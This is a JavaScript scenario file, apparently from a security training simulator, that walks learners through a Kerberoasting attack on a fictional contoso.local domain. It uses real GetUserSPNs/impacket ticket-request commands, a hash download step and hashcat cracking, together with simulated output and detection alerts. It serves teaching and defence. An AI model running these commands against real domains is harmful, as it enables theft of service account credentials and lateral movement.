/**
 * Kerberoasting Attack Scenario
 *
 * This scenario simulates the Kerberoasting attack, where an attacker requests
 * service tickets for accounts with SPNs and attempts to crack them offline.
 */

export const kerberoastScenario = {
  id: 'kerberoasting',
  title: 'Kerberoasting: Service Account Credential Theft',
  description: 'Learn how attackers extract and crack service account credentials using Kerberos service tickets.',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**Kerberoasting** is an attack that exploits the Kerberos authentication protocol to extract and crack service account credentials.

**Attack Flow:**
1. Enumerate Service Principal Names (SPNs) in the domain
2. Request service tickets and extract them into a crackable hash file.
3. **Download the captured hash file from the remote machine.**
4. Crack the hashes offline using a password dictionary.

**Why This Matters:**
Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts.
    
**Note:** This scenario uses the 'svc_backup' credentials compromised in the AS-REP Roasting mission.`,

    steps: [
      {
        number: 1,
        title: 'Enumerate Service Accounts',
        description: 'Use the compromised "svc_backup" account to run an LDAP query. Find the password in your "Files" tab and insert it into the command.',
        command: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB]',
        tip: 'Check the "Files" tab for the credential you harvested in the AS-REP Roasting scenario.'
      },
      {
        number: 2,
        title: 'Request & Extract Service Tickets',
        description: 'Using the "svc_backup" credentials, request Kerberos service tickets (TGS) and save them to a file.',
        command: 'impacket-getTGSs -request contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB] -spn MSSQLSvc/SQL01.contoso.local -outputfile kerberoast_hashes.txt',
        tip: 'The -outputfile flag saves the hashes in a format hashcat can use.'
      },
      {
        number: 3,
        title: 'Download Loot',
        description: 'The hashes were saved to "kerberoast_hashes.txt" on the machine. Use "ls" to confirm and "download" to retrieve it.',
        command: 'download kerberoast_hashes.txt',
        tip: 'This will add the hash file to your "Files" tab.'
      },
      {
        number: 4,
        title: 'Crack Passwords',
        description: 'Now that you have the file, use hashcat (mode 13100) to crack the hashes and recover service account credentials.',
        command: 'hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --force',
        tip: 'The cracked password for "sqlservice" will be added to your Files tab.'
      },
      {
        number: 5,
        title: 'Verify Compromised Accounts',
        description: 'The credentials for "sqlservice" are now in your "Files" tab, ready for the next mission.',
        command: null,
        tip: 'Compromised service accounts can now be used for lateral movement and privilege escalation'
      }
    ]
  },

  steps: [
    {
      id: 1,
      expectedCommand: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:[LOOT:svc_backup]',
      attackerOutput: [
        '[*] Enumerating Service Principal Names (SPNs)...',
        '[*] Connecting to DC01.contoso.local (10.0.1.10)',
        '[+] Authentication successful',
        '[*] Querying LDAP for SPN accounts...',
        '[+] Found 12 accounts with SPNs:',
        '[+]   - MSSQLSvc/SQL01.contoso.local (sqlservice)',
        '[+]   - HTTP/webserver01.contoso.local (iis_app)',
        '[+]   - LDAP/DC01.contoso.local (krbtgt)',
        //...
        '[+] Enumeration complete'
      ],
      serverOutput: [
        '[LDAP] LDAP query from 10.0.0.5:49152',
        '[LDAP] Query: (servicePrincipalName=*)',
        '[AUDIT] SPN enumeration detected from 10.0.0.5'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: 'impacket-getTGSs -request contoso.local/svc_backup:[LOOT:svc_backup] -spn MSSQLSvc/SQL01.contoso.local -outputfile kerberoast_hashes.txt',
      attackerOutput: [
        '[*] Requesting TGS for MSSQLSvc/SQL01.contoso.local...',
        '[*] Using credentials: svc_backup@contoso.local',
        '[*] Connecting to KDC...',
        '[+] TGS request successful',
        '[+] Received TGS ticket for sqlservice',
        '[*] Requesting TGS for HTTP/webserver01.contoso.local...',
        '[+] TGS request successful',
        '[+] Received TGS ticket for iis_app',
        '[*] Saving hashes to kerberoast_hashes.txt',
        '[+] Hashes saved!'
      ],
      serverOutput: [
        '[KERBEROS] TGS-REQ from 10.0.0.5',
        '[KERBEROS] SPN: MSSQLSvc/SQL01.contoso.local',
        '[KERBEROS] Issuing TGS ticket',
        '[KERBEROS] TGS-REQ from 10.0.0.5',
        '[KERBEROS] SPN: HTTP/webserver01.contoso.local',
        '[KERBEROS] Issuing TGS ticket',
        '[ALERT] Multiple TGS requests from single source (10.0.0.5)'
      ],
      delay: 400,
      // --- NEW: This step now places the file in the simulated system ---
      lootToGrant: {
        files: {
          'kerberoast_hashes.txt': {
            content: '$krb5tgs$23$*sqlservice$contoso.local...[snip]...\n$krb5tgs$23$*iis_app$contoso.local...[snip]...',
            size: '8 KB'
          }
        }
      }
    },
    {
      id: 3,
      expectedCommand: 'download kerberoast_hashes.txt',
      attackerOutput: [
        '[*] Downloading "kerberoast_hashes.txt"...',
        '[+] File "kerberoast_hashes.txt" (8 KB) downloaded successfully.',
        '[+] File added to your "Files" tab.'
      ],
      serverOutput: [
        '[NET] File transfer detected from 10.0.0.5 (kerberoast_hashes.txt)',
        '[AUDIT] Potential exfiltration of data.'
      ],
      delay: 400,
      // --- NEW: This step moves the file to the "Files" tab ---
      lootToGrant: {
        download: [{ id: 'kb', name: 'kerberoast_hashes.txt', size: '8 KB' }]
      }
    },
    {
      id: 4,
      expectedCommand: 'hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --force',
      attackerOutput: [
        '[*] Starting Hashcat TGS-REP cracking...',
        '[*] Mode: Kerberos 5 TGS-REP etype 23 (13100)',
        '[*] Wordlist: wordlist.txt (500,000 entries)',
        '[*] Cracking in progress...',
        '[*] 25% complete - 125,000 hashes/sec',
        '[*] 50% complete - 128,000 hashes/sec',
        '[*] 75% complete - 127,500 hashes/sec',
        '[+] Hash cracked!',
        '[+] sqlservice : P@ssw0rd123!',
        '[+] Hash cracked!',
        '[+] iis_app : ServicePass2024',
        '[+] Cracking complete - 2 of 3 passwords recovered'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (offline cracking)',
        '[AUDIT] Attacker has extracted service account credentials',
        '[ALERT] Service accounts compromised: sqlservice, iis_app'
      ],
      delay: 500,
      // --- NEW: This step adds the cracked passwords to the "Files" tab ---
      lootToGrant: {
        creds: [
          { type: 'Password', username: 'sqlservice', secret: 'P@ssw0rd123!' },
          { type: 'Password', username: 'iis_app', secret: 'ServicePass2024' }
        ]
      }
    },
    {
      id: 5,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] Kerberoasting Attack Summary',
        '[+] ============================================',
        '[+] SPNs Enumerated: 12',
        '[+] Hashes Extracted: 2',
        '[+] Passwords Cracked: 2',
        '[+] Compromised Accounts:',
        '[+]   - sqlservice (P@ssw0rd123!)',
        '[+]   - iis_app (ServicePass2024)',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use compromised credentials for lateral movement',
        '[*] 2. Run BloodHound with the new "sqlservice" credentials',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Service account credentials compromised',
        '[ALERT] Recommend immediate password reset for:',
        '[ALERT]   - sqlservice',
        '[ALERT]   - iis_app',
        '[ALERT] Review recent access logs for lateral movement'
      ],
      delay: 400
    }
  ]
};

export default kerberoastScenario;